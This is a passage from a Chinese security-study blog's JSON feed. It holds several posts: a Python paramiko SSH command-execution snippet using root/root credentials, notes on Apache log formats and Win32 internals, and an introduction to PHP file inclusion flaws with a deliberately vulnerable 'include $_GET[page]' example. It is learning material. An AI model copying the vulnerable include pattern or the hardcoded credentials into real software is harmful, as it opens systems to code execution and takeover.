punctuation\">,</span> user<span class=\"token punctuation\">,</span> passwd<span class=\"token punctuation\">,</span> command<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    client <span class=\"token operator\">=</span> paramiko<span class=\"token punctuation\">.</span>SSHClient<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token comment\"># client.load_host_keys('/root/.ssh/konw_hosts')</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    client<span class=\"token punctuation\">.</span>set_missing_host_key_policy<span class=\"token punctuation\">(</span>paramiko<span class=\"token punctuation\">.</span>AutoAddPolicy<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    client<span class=\"token punctuation\">.</span>connect<span class=\"token punctuation\">(</span>ip<span class=\"token punctuation\">,</span> username<span class=\"token operator\">=</span>user<span class=\"token punctuation\">,</span> password<span class=\"token operator\">=</span>passwd<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    ssh_session <span class=\"token operator\">=</span> client<span class=\"token punctuation\">.</span>get_transport<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>open_session<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">if</span> ssh_session<span class=\"token punctuation\">.</span>active<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        ssh_session<span class=\"token punctuation\">.</span>exec_command<span class=\"token punctuation\">(</span>command<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>ssh_session<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">1024</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token string\">'utf-8'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">\"__main__\"</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    loging_shh<span class=\"token punctuation\">(</span><span class=\"token string\">'192.168.199.128'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'root'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'root'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'id'</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>运行程序后得到了服务器执行命令后的结果<br />\n<img data-src=\"image001.png\" alt=\"\" /></p>\n<h2 id=\"编写返回命令的ssh\"><a class=\"anchor\" href=\"#编写返回命令的ssh\">#</a> 编写返回命令的 SSH</h2>\n<p>通常情况下，可以使用 SSH 客户端连接 SSH 服务器，但 Windows 本身不一定装有 SSH 服务端，所以我们需要反向将命令从 SSH 服务端发送给 SSH 客户端。（即客户端控制服务端）</p>\n<p><span class=\"label\">Code</span></p>\n<pre><code class=\"language-python\">\n\n</code></pre>\n",
            "tags": [
                "BHP",
                "python"
            ]
        },
        {
            "id": "https://self-ferry.github.io/2021/01/22/apache%E8%AE%BF%E9%97%AE%E6%97%A5%E5%BF%97%E8%AF%A6%E8%A7%A3%E3%80%90%E8%BD%AC%E3%80%91/",
            "url": "https://self-ferry.github.io/2021/01/22/apache%E8%AE%BF%E9%97%AE%E6%97%A5%E5%BF%97%E8%AF%A6%E8%A7%A3%E3%80%90%E8%BD%AC%E3%80%91/",
            "title": "apache访问日志详解【转】",
            "date_published": "2021-01-22T14:37:03.000Z",
            "content_html": "<h1 id=\"正文\"><a class=\"anchor\" href=\"#正文\">#</a> 正文</h1>\n<p><span class=\"label dergous\">源自：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vdG91Y2gtcHJjL3AvMTI3NTYxODkuaHRtbA==\">https://www.cnblogs.com/touch-prc/p/12756189.html</span></span></p>\n<h2 id=\"路径\"><a class=\"anchor\" href=\"#路径\">#</a> 路径</h2>\n<p>windows : 默认或者自定义 Apache 的安装路径 \\logs\\access.log|error.log|install|ssl_request.log</p>\n<p>linux:/usr/local/apache/logs/access_log|error_log</p>\n<h2 id=\"apache访问日志格式\"><a class=\"anchor\" href=\"#apache访问日志格式\">#</a> Apache 访问日志格式</h2>\n<p>192.168.106.128 - - [01/Apr/2020:10:37:19 +0800] &quot;GET /HTTP/1.1&quot; 200 45</p>\n<p>各字段代表的内容如下：</p>\n<p>192.168.106.128   ---------- 远程主机的 ip 地址，表明访问网站的是谁。</p>\n<p>空白 -                       ---------- 为了避免用户的邮箱被垃圾邮件骚扰，就用 - 代替</p>\n<p>空白 -                       ---------- 用于记录浏览者进行身份验证时提供的名字</p>\n<p>[01/Apr/2020:10:37:19 +0800] --------- 请求的时间。时间信息最后的 + 0800 是服务器所在时区未于 UTC 之后的 8 小时</p>\n<p>GET /HTTP/1.1                  ---------- 请求的方法 + 资源 + 协议，该项信息的典型格式是 method resource protocol</p>\n<p>200                          -------- 状态码，即请求是否成功或者遇到了什么问题。200 为成功响应请求，一切正常</p>\n<p>45                           ----------  发送的字节数</p>\n<h2 id=\"配置apache访问日志格式命令及参数\"><a class=\"anchor\" href=\"#配置apache访问日志格式命令及参数\">#</a> 配置 Apache 访问日志格式命令及参数</h2>\n<p>LogFormat 指令：定义格式并为格式指定一个名字</p>\n<p>CustomLog 指令：设置日志文件并指明日志文件所用的格式</p>\n<p>LogFormat &quot;% h % l % u % t&quot;% r&quot;%&gt;s % b&quot; common   定义格式和名字</p>\n<p>CustomLog &quot;logs/access.log&quot; common    普通文件记录</p>\n<table style=\"height: 41px; width: 452px\" border=\"0\">\n<tr>\n<td style=\"text-align: center\">%h</td>\n<td style=\"text-align: center\">%i</td>\n<td style=\"text-align: center\">%t</td>\n<td style=\"text-align: center\">%u</td>\n<td style=\"text-align: center\">%r</td>\n<td style=\"text-align: center\">%b</td>\n<td style=\"text-align: center\">%&gt;s</td>\n</tr>\n<tr>\n<td style=\"text-align: center\">远端主机</td>\n<td style=\"text-align: center\">远端登录名</td>\n<td style=\"text-align: center\">远端用户名</td>\n<td style=\"text-align: center\">时间</td>\n<td style=\"text-align: center\">请求第一行</td>\n<td style=\"text-align: center\">传输字节数</td>\n<td style=\"text-align: center\">状态</td>\n</tr>\n</table>\n<p>LogFormat &quot;%h %l %u %t &quot;%r&quot; %&gt;s %b &quot;%{Referer}i&quot; &quot;%{User-Agent}i&quot;&quot; combined</p>\n<p>CustomLog logs/access_log combined 复合日志记录</p>\n<table border=\"0\" align=\"left\">\n<tr>\n<td>%{Referer}i\\</td>\n<td style=\"text-align: center\">\\\"%{User-Agent}i\\</td>\n</tr>\n<tr>\n<td>请求来源</td>\n<td>客户端浏览器提供的浏览器识别信息</td>\n</tr>\n</table>\n<h2 id=\"apache错误日志格式\"><a class=\"anchor\" href=\"#apache错误日志格式\">#</a> Apache 错误日志格式</h2>\n<p>错误日志无论在格式上还是在内容上都和访问日志不同。错误日志和访问日志一样提供丰富的信息，我们可以利用这些信息分析服务器的运行情况、哪里出现了问题。错误日志记录了服务器运行期间遇到的各种错误，以及一些普通的诊断信息，比如服务器何时启动、何时关闭等。我们可以设置日志文件记录信息级别的高低，控制日志文件记录信息的数量和类型。这是通过 LogLevel 指令设置的，该指令默认设置的级别是 error，即记录称得上错误的事件。有关该指令中允许设置的各种选项的完整清单，请参见 http://www.apache.org/docs/mod/core.html#loglevel 的 Apache 文档。在日志文件中的内容分属两类：文档错误和 CGI 错误。错误日志中偶尔也会出现配置错误，另外还有前面提到的服务器启动和关闭信息。</p>\n<h3 id=\"1文档错误\"><a class=\"anchor\" href=\"#1文档错误\">#</a> （1）文档错误</h3>\n<p>[Fri Mar 30 14:45:09 2018] [error] [client 192.168.115.120]</p>\n<p>user <span class=\"exturl\" data-url=\"bWFpbHRvOmNldmFwaUBzaW5nLmNvbQ==\">cevapi@sing.com</span> : authentication failure for &quot;/cgi-bin/hivpoo/cook.py&quot; : password mismatch</p>\n<ol>\n<li>\n<p>错误发生的日期和时间</p>\n</li>\n<li>\n<p>错误的级别或严重性</p>\n</li>\n<li>\n<p>导致错误的 IP 地址</p>\n</li>\n<li>\n<p>错误信息本身。</p>\n</li>\n</ol>\n<h3 id=\"2cgi错误\"><a class=\"anchor\" href=\"#2cgi错误\">#</a> （2）CGI 错误</h3>\n<p>错误日志最主要的用途或许是诊断行为异常的 CGI 程序。为了进一步分析和处理方便，CGI 程序输出到 STDERR（Standard Error，标准错误设备）的所有内容都将直接进入错误日志。这意味着，任何编写良好的 CGI 程序，如果出现了问题，错误日志就会告诉我们有关问题的详细信息。CGI 程序错误输出到错误日志也有它的缺点，错误日志中将出现许多没有标准格式的内容，这使得用错误日志自动分析程序从中分析出有用的信息变得相当困难。</p>\n",
            "tags": [
                "web",
                "apache",
                "log"
            ]
        },
        {
            "id": "https://self-ferry.github.io/2021/01/20/%E3%80%8A%E5%8A%A0%E5%AF%86%E4%B8%8E%E8%A7%A3%E5%AF%86%E3%80%8B%E7%AC%AC%E4%B8%80%E7%AB%A0/",
            "url": "https://self-ferry.github.io/2021/01/20/%E3%80%8A%E5%8A%A0%E5%AF%86%E4%B8%8E%E8%A7%A3%E5%AF%86%E3%80%8B%E7%AC%AC%E4%B8%80%E7%AB%A0/",
            "title": "《加密与解密》第一章",
            "date_published": "2021-01-20T04:24:48.000Z",
            "content_html": "<p><span class=\"label success\">✔️来首音乐吧</span></p>\n<div class=\"media-container\"><div class=\"player\" data-type=\"audio\" data-src='[{\"title\":\"列表 1\",\"list\":[\"https://music.163.com/#/song?id=486999662\"]}]'></div></div>\n<h1 id=\"windows操作系统\"><a class=\"anchor\" href=\"#windows操作系统\">#</a> Windows 操作系统</h1>\n<p>本书研究 Windows 平台上的加密与解密，因此要求读者必须对操作系统有所了解。建议读者阅读 Windows 操作系统原理方面的书籍，这对深入理解本书的后续内容很有帮助。</p>\n<h2 id=\"win32-api函数\"><a class=\"anchor\" href=\"#win32-api函数\">#</a> Win32 API 函数</h2>\n<p>现在很多讲程序设计的书都基于 MFC 库和 OWL 库的 Windows 设计，对 Windows 实现细节鲜有讨论，而调试程序是要和系统底层打交道的，所以有必要掌握一些 API 函数的知识。</p>\n<p>对初学者来说，API 函数也许是一个时常耳闻却感觉有些神秘的东西。 API 的英文全称为 &quot;Application Programming Interface&quot; (应用程序编程接口), 要想理解这个定义，需要追溯操作系统的发展历史。 当 Windows 操作系统开始占据主导地位的时候，开发 Windows 平台上的应用程序成为人们的需要。 而在 Windows 程序设计发展的初期，Windows 程序员能够使用的编程工具只有 API 函数。这些函数提供应用程序运行所需要的窗口管理、图形设备接口、内存管理等服务功能。 这些功能以函数库的形式组织在一起，形成了 Windows 应用程序编程接口，简称 &quot;Win API&quot;, Win API 子系统负责将 API 调用转换成 Windows 操作系统的系统服务调用。 所以，可以认为 API 函数是整个 Windows 框架的基石，它的下面是 Windows 操作系统核心，它的上面则是 Windows 应用程序，如图 1.3 所示。 应用程序开发人员看到的 Windows 操作系统实际上就是 Win API, Windows 操作系统的其他部分对开发人员来说是完全透明的。</p>\n<p><img data-src=\"image001.png\" alt=\"\" /></p>\n<p>用于 16 位 Windows 的 API (Windows 1.0~Windows 3.1) 称作 &quot;Win16&quot;, 用于 32 位 Windows 的 API ( Windows 9x/NT/2000/XP/7/10 ) 称作 &quot;Win32&quot;, 64 位 Windows API 的名称和功能基本没有变化，还是使用 Win32 的函数名，只不过是用 64 位代码实现的。 API 函数调用在从 Win16 到 Win32 的转变中保持兼容，并在数量和功能上不断增强 - Windows 1.0 只支持不到 450 个函数调用，现在已有几千个函数了。</p>\n<p>所有 32 位 Windows 都支持 Win16 API (以确保与旧的应用程序兼容) 和 Win32 API (以运行新的应用程序), 非常有趣的是，Windows NT/2000/xP/7 与 Windows 9x 的工作方式不同。 在 WindowsNT/2000XKP/7 中，Winl6 函数调用通过一个转换层转换为 Win32 函数调用，然后被操作系统处理。在 Windows 9x 中，该操作正好相反，Win32 函数调用通过转换层转换为 Win16 函数调用，再由操作系统进行处理。</p>\n<p>Windows 运转的核心是动态链接。 Windows 提供了丰富的应用程序可利用的函数调用，这些函数采用动态链接库 (DLL) 实现。 在 Windows 9x 中，DLL 通常位于 1WINDOWSYSTEM 子目录中。在 Windows NT72000/XP/7 中，DLL 通常位于系统安装目录的 SYSTEM 和 SYSTEM32 子目录中。</p>\n<p>在早期，Windows 的主要部分只需要在 3 个动态链接库中实现，它们分别代表 Windows 的 3 个主要子系统，叫作 Kernel, User 和 GDI。<br />\n- Kerel (由 KERNEL32.DLL 实现): 操作系统核心功能服务，包括进程与线程控制、内存管理、文件访问等。<br />\n- User (由 USER32.DL. 实现): 负责处理用户接口，包括键盘和鼠标输入、窗口和菜单管理等。<br />\n- GDI (由 GD132.DLL 实现): 图形设备接口，允许程序在屏幕和打印机上显示文本和图形。</p>\n<p>除了上述模块，Windows 提供了其他 DLL 以支持更多的功能，包括对象安全性、注册表操作 (ADVAPI32. DLL)、通用控件 (COMCTL.32.DL)、公共对话框 (COMDLG32. DLL )、用户界面外壳 SHELL32.DLL) 和网络 (NETAPI32. DLL)。</p>\n<p>虽然 Win API 是一个基于 C 语言的接口，但是 Win API 中的函数可以由用不同语言编写的程序调用，因此，我们只要在调用时遵循调用的规范即可。</p>\n<p>Unicode 影响着计算机工业的每个部分，对操作系统和编程语言的影响最大。 NT 系统是使用 Unicode 标准字符集重新开发的，其系统核心完全是用 Unicode 函数工作的。 如果希望调用一个 Windows 函数并向它传递一个 ANSI 字符串，系统会先将 ANSI 字符串转换成 Unicode 字符串，再将 Unicode 字符串传递给操作系统。 相反，如果希望函数返回 ANSI 字符串，系统会先将 Unicode 字符串转换成 ANSI 字符串，然后将结果返回应用程序。 也就是说，在 NT 架构下，Win32 API 能接受 Unicode 和 ASCI 两种字符集，而其内核只能使用 Unicode 字符集。 尽管这些操作对用户来说都是透明的，但字符串的转换需要占用系统资源。</p>\n<p>在 Win32 API 函数字符集中，&quot;A&quot; 表示 ANSI, &quot;W&quot; 表示 Widechars (即 Unicode), 前者就是通常使用的单字节方式；后者是宽字节方式，以便处理双字节字符。 每个以字符串为参数的 Win32 函数在操作系统中都有这两种方式的版本。 例如，在编程时使用 MessageBox 函数，而在 USER32.DLL 中却没有 32 位 MessageBox 函数的人口。 实际上有两个人口，一个名为 &quot;MessageBoxA&quot; ( ANSI 版), 另一个名为 &quot;MessageBoxW&quot; (宽字符版)。 幸运的是，程序员通常不必关心这个问题，只需要在编程时使用 MessageBox 函数，开发工具的编译模块就会根据设置来决定是采用 MessageBoxA 还是 MessageBoxW。</p>\n<p>这里以 MessageBox 函数为例讨论一下。 此函数用于在 USER32.DLL 用户模块中创建和显示信息框，函数原型如下。</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">MessageBox</span><span class=\"token punctuation\">(</span> </pre></td></tr><tr><td data-num=\"2\"></td><td><pre>HWND hWnd<span class=\"token punctuation\">,</span>        <span class=\"token comment\">// 父窗口句柄 </span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>LPCTSTR IpText<span class=\"token punctuation\">,</span>    <span class=\"token comment\">// 消息框文本地址 </span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>LPCTSTR IpCaption<span class=\"token punctuation\">,</span>  <span class=\"token comment\">// 消息框标题地址 </span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>UINT uType          <span class=\"token comment\">// 消息框样式</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>看一看 Windows 2000 里 MessageBoxA 函数的内部结构，具体如下。</p>\n<pre><code class=\"language-c++\">int MessageBoxA( \nMessageBoxExA &#123;   //调用MessageBoxExA函数 \nMBTоWCSEx()        //将MessageBoxA消息框的主体文字转换成Unicode字符串 \nMBToWCSEx()       //将MessageBoxA消息框标题栏上的文字转换成Unicode字符串 \nMessageBoxExW( )  //调用MessageBoxExw函数 \nHeapFree ( ) //释放内存\n&#125;\n);\n</code></pre>\n<p>这个结果表明，MessageBoxExA 函数其实是一个替换翻译层，用于分配内存，并将 ANSI 字符串转换成 Unicode 字符串，系统最终调用 Unicode 版的 MessageBoxExW 函数执行。 当 Message BoxW 函数返回时，它便释放内存缓存。 在这个过程中，系统必须执行这些额外的转换操作，因此，ANSI 版的应用程序需要更多的内存及更多的 CPU 资源，而 Unicode 版的程序在 NT 架构下的执行效率高了很多。</p>\n<p>Win32 程序大量调用系统提供的 API 函数，而 Win32 平台上的调试器 (例如 ollybg 等) 恰好有针对 API 函数设置断点的强大功能，因此，掌握常见 API 函数的用法会给程序的跟踪调试带来极大的方便 (详细的 Win32 API 参考文档可以从 MSDN 网站获得), 建议读者掌握一定的 Win32 编程知识 (可参考《Windows 程序设计》一书), 这对合理选择 API 函数有很大的帮助。</p>\n<h2 id=\"wow64\"><a class=\"anchor\" href=\"#wow64\">#</a> WOW64</h2>\n<p>wow64 (Windows-on-Windows 64-bit) 是 64 位 Windows 操作系统的子系统，可以使大多数 32 位应用程序在不进行修改的情况下运行在 64 位操作系统上。</p>\n<p>64 位的 Windows, 除了带有 64 位操作系统应有的系统文件，还带有 32 位操作系统应有的系统文件。Windows 的 64 位系统文件都放在一个叫作 &quot;System32&quot; 的文件夹中，\\Windows\\System32 文件夹中包含原生的 64 位映像文件。为了兼容 32 位操作系统，还增加了 \\Windows\\SysWOW64 文件夹，其中存储了 32 位的系统文件。</p>\n<p>64 位应用程序会加载 System32 目录下 64 位的 kernel32.dll, user32.dll 和 ntdll.dll。当 32 位应用程序加载时，wow64 建立 32 位 ntdl.da 所要求的启动环境，将 CPU 模式切换至 32 位，并开始执行 32 位加载器，就如同该进程运行在原生的 32 位系统上一样。wow64 会对 32 位 ntdll.dl 的调用重定向 ntdll.dl (64 位), 而不是发出原生的 32 位系统调用指令。wow64 转换到原生的 64 位模式，捕获与系统调用有关的参数，发出对应的原生 64 位系统调用。当原生的系统调用返回时，wow64 在返回 32 位模式之前将所有输出参数从 64 位转换成 32 位。</p>\n<p>wow64 既不支持 16 位应用程序的执行 (32 位 Windows 支持 16 位应用程序的执行), 也不支持加载 32 位内核模式的设备驱动程序。wow64 进程只能加载 32 位的 DLL, 不能加载原生的 64 位 DLL。类似的，原生的 64 位进程不能加载 32 位的 DLL。</p>\n<h2 id=\"windows消息机制\"><a class=\"anchor\" href=\"#windows消息机制\">#</a> Windows 消息机制</h2>\n<p>Windows 是一个消息 (Message) 驱动式系统。Windows 消息提供在应用程序与应用程序之间、应用程序与 Windows 系统之间进行通信的手段。应用程序想要实现的功能由消息触发，通过对消息的响应和处理完成。<br />\nWindows 系统中有两种消息队列：一种是系统消息队列；另一种是应用程序消息队列。计算机的所有输入设备由 Windows 监控。当一个事件发生时，Windows 先将输入的消息放入系统消息队列，再将输入的消息复制到相应的应用程序队列中，应用程序中的消息循环在它的消息队列中检索每个消息并发送给相应的窗口函数。一个事件从发生到到达处理它的窗口函数必须经历上述过程。值得注意的是消息的非抢先性，即不论事件的急与缓，总是按到达的先后排队 (一些系统消息除外), 而这可能导致一些外部实时事件得不到及时的处理。</p>\n<p>因为 Windows 本身是由消息驱动的，所以在调试程序时跟踪一个消息会得到相当底层的答案。</p>\n<p>下面将常用的 Windows 消息函数列出，以供参考。<br />\n(1) SendMessage 函数调用一个窗口的窗口函数，将一条消息发给那个窗口。除非消息处理完毕，否则该函数不会返回。该函数示例如下。</p>\n<pre><code class=\"language-c++\">LRESULT SendMessage ( \nHWND hWnd,         //目的窗口的句柄 \nUINT Msg,           //消息标识符 \nWPARAM wParam,   //消息的WPARAM域 \nLPARAM 1Param //消息的LPARAM域\n&#125; ;\n</code></pre>\n<p>返回值：由具体的消息决定。如果消息投递成功，则返回 &quot;TRUE&quot; (非零)。</p>\n<p>(2) WM-COMMAND 消息当用户从菜单或按钮中选择一条命令或者一个控件时该消息被发送给它的父窗口，或者当一个快捷键被释放时发送，示例如下。Visual C++ 的 WINUSER.H 文件定义，WM_COMMAND 消息所对应的十六进制数是 0111h。</p>\n<pre><code class=\"language-c++\">WM_COMMAND \n    wNotifyCode = HIWORD (WParam);   //通告代码 \n    wID = LOWORD (wParam);   //菜单条目、控件或快捷键的标识符 \n    hwndctl = (HWND) IParam; //按件句柄\n</code></pre>\n<p>返回值：如果应用程序处理这条消息，则返回值为零。</p>\n<p>(3) WM_DESTROY 消息当一个窗口被销毁时发送该消息。该消息的十六进制数是 02h, 没有参数。</p>\n<p>返回值：如果应用程序处理这条消息，则返回值为零。</p>\n<p>(4) WM-GETTEXT 消息应用程序发送一条 WM_GETTEXT 消息，将一个对应窗口的文本复制到一个由呼叫程序提供的缓冲区中，示例如下。WM_GETTEXT 消息的十六进制数是 0Dh。</p>\n<pre><code class=\"language-c++\">WM GETTEXT\n    wParam = (WPARAM) cchTextMax;  //需要复制的字符数\n    lParam = (LPARAM) IpszText;   //接收文本的缓冲区地址\n</code></pre>\n<p>返回值：被复制的字符数。</p>\n<p>(5) wMLQUTT 消息当应用程序调用 PostQuitMessage 函数时，生成 WM-QUIT 消息，示例如下。WM_QUTT 消息的十六进制数是 012h</p>\n<pre><code class=\"language-c++\">WM QUIT\nnExitCode = (int) wParam;//退出代码\n</code></pre>\n<p>返回值：这条消息没有返回值。</p>\n<p>(6) WM_LBUTTONDOWN 消息当光标停在一个窗口的客户区且用户按下鼠标左键时，wMLBUTTONDOWN 消息将被发送，示例如下。如果鼠标动作未被捕获，这条消息将被发送给光标下的窗口；否则，将被发送给已经捕获鼠标动作的窗口。WM_LBUTTONDOWN 消息的十六进制数是 0201h。</p>\n<pre><code class=\"language-c++\">WM LBUTTONDOWN \nfwKeys = wParam;                //key旗标 \nxPos = LOWORD (IParam);  //光标的水平位置 \nyPos = HIWORD (IParam);  //光标的垂直位置\n</code></pre>\n<h2 id=\"虚拟内存\"><a class=\"anchor\" href=\"#虚拟内存\">#</a> 虚拟内存</h2>\n<p>在默认情况下，32 位 Windows 操作系统的地址空间在 4GB 以内。Win32 的平坦内存模式使每个进程都拥有自己的虚拟空间。对 32 位进程来说，这个地址空间是 4CB, 因为 32 位指针拥有 00000000h~FFFFFFFFh 任何值。此时，程序的代码和数据都放在同一地址空间中，不必区分代码段和数据段。</p>\n<p>虚拟内存 (Virtual Memory) 不是真正的内存，它通过映射 (Map) 的方法使可用虚拟地址 ( VirtualAddress ) 达到 4GB, 每个应用程序可以获得 2GB 的虚拟地址，剩下的 2GB 留给操作系统自用。在 Windows NT 中，应用程序甚至可以获得 3GB 的虚拟地址。</p>\n<p>Windows 是一个分时的多任务操作系统，CPU 时间在被分成一个个时间片后分配给不同的程序。在一个时间片里，与这个程序的执行无关的内容不会映射到线性地址中。因此，每个程序都有自己的 4GB 寻址空间，互不干扰。在物理内存中，操作系统和系统 DLL. 代码需要供每个应用程序调用，所以它们在任意时刻必须被映射。用户的 EXE 程序只在自己所属的时间片内被映射，用户 DLL 则有选择地被映射。</p>\n<p>简单地说，虚拟内存的实现方法和过程如下。</p>\n<p>①当一个应用程序启动时，操作系统就创建一个进程，并给该进程分配 2CB 的虚拟地址 (不是内存，只是地址)。</p>\n<p>②虚拟内存管理器将应用程序的代码映射到那个应用程序的虚拟地址中的某个位置，并把当前需要的代码读入物理地址 (注意：虚拟地址与应用程序代码在物理内存中的位置是没有关系的)。</p>\n<p>③如果使用 DLL, DLL 也会被映射到进程的虚拟地址空间中，在需要的时候才会被读入物理内存。</p>\n<p>④其他项目 (数据、堆栈等) 的空间是从物理内存中分配的，并被映射到虚拟地址空间中。</p>\n<p>⑤应用程序通过使用其虚拟地址空间中的地址开始执行。然后，虚拟内存管理器把每次内存访问映射到物理位置。</p>\n<p>看不明白上面的步骤也不要紧，但要明白以下几点。</p>\n<ul>\n<li>应用程序不会直接访问物理地址。</li>\n<li>虚拟内存管理器通过虚拟地址的访问请求来控制所有的物理地址访问。</li>\n<li>每个应用程序都有独立的 4GB 寻址空间，不同应用程序的地址空间是彼此隔离的。</li>\n<li>DLL 程序没有 “私有” 空间，它们总是被映射到其他应用程序的地址空间中，作为其他应用程序的一部分运行。其原因是：如果 DLL 不与其他程序处于同一个地址空间，应用程序就无法调用它。</li>\n</ul>\n<p>使用虚拟内存的好处是：简化了内存的管理，弥补了物理内存的不足，可以防止多任务环境下应用程序之间的冲突。<br />\n64 位 Windows 操作系统提供了 16TB 的有效寻址空间，其中的一半可用于用户模式的应用程序。</p>\n<h1 id=\"反思\"><a class=\"anchor\" href=\"#反思\">#</a> 反思</h1>\n<p>不会的太多了，明天开始还是接着看视频吧。初学者不知道重点在哪。脑壳痛，giao!</p>\n",
            "tags": [
                "加密与解密",
                "win32api",
                "WOW64",
                "windows消息机制",
                "虚拟内存"
            ]
        },
        {
            "id": "https://self-ferry.github.io/2021/01/20/web%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/",
            "url": "https://self-ferry.github.io/2021/01/20/web%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/",
            "title": "web漏洞-文件包含",
            "date_published": "2021-01-20T04:12:47.000Z",
            "content_html": "<p><span class=\"label success\">✔️来首音乐吧</span></p>\n<div class=\"media-container\"><div class=\"player\" data-type=\"audio\" data-src='[{\"title\":\"列表 1\",\"list\":[\"http://music.163.com/#/song?id=33522741\"]}]'></div></div>\n<h1 id=\"文件包含漏洞简介\"><a class=\"anchor\" href=\"#文件包含漏洞简介\">#</a> 文件包含漏洞简介</h1>\n<ol>\n<li>\n<p>什么是文件包含漏洞？<br />\n程序开发人员通常会把可重复使用的函数写到单个文件中，在使用某些函数时，直接调用此文件，无需再次编写，这种调用文件的过程一般被称为文件包含。</p>\n</li>\n<li>\n<p>文件包含漏洞的成因<br />\n随着网站业务的需求，程序开发人员一般希望代码更灵活，所以将被包含的文件设置为<ins class=\"primary\">变量</ins>，用来进行动态调用，用户可以对<ins class=\"primary\">变量的值可控</ins>而服务器端未对变量值进行合理地校验或者校验被绕过，这样就导致了文件包含漏洞。通常文件包含漏洞出现在 PHP 语言中。</p>\n<ul>\n<li>php 中常见包含文件的函数\n<ul>\n<li>include () 当使用该函数包含文件时，只有代码执行到 include () 函数时才将文件包含进来，发生错误时之给出一个警告，继续<ins class=\"primary\">向下执行</ins>。</li>\n<li>include_once () 功能与 Include () 相同，区别在于当重复调用同一文件时，<ins class=\"primary\">程序只调用一次</ins></li>\n<li>require () require () 与 include () 的区别在于 require () 执行如果发生错误，函数会输出错误信息，并<ins class=\"primary\">终止脚本的运行</ins>。</li>\n<li>require_once () 功能与 require () 相同，区别在于当重复调用同一文件时，<ins class=\"primary\">程序只调用一次</ins></li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<p>文件包含漏洞的分类</p>\n<p>文件包含漏洞可以分为 RFI (远程文件包含) 和 LFI（本地文件包含漏洞）两种。而区分他们最简单的方法就是 php.ini 中是否开启了 allow_url_include。如果开启 了我们就有可能包含远程文件。</p>\n<p>1、本地文件包含 LFI (Local File Include)</p>\n<p>2、远程文件包含 RFI (Remote File Include)（需要 php.ini 中 allow_url_include=on、allow_url_fopen = On）</p>\n<p>在 php.ini 中，allow_url_fopen 默认一直是 On，而 allow_url_include 从 php5.2 之后就默认为 Off。</p>\n</li>\n<li>\n<p>文件包含漏洞的危害</p>\n<ul>\n<li>配合文件上传漏洞 GetShell</li>\n<li>可以执行任意脚本代码</li>\n<li>网站源码文件以及配置文件泄露</li>\n<li>远程包含 GetShell</li>\n<li>控制整个网站甚至是服务器</li>\n</ul>\n</li>\n</ol>\n<h1 id=\"常见漏洞环境\"><a class=\"anchor\" href=\"#常见漏洞环境\">#</a> 常见漏洞环境</h1>\n<p>了解这些主要是为了绕过</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"><span>示例</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> </pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span>page<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">&#123;</span> </pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">include</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span>page<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">include</span> <span class=\"token string single-quoted-string\">'show.php'</span><span class=\"token punctuation\">;</span> </pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span 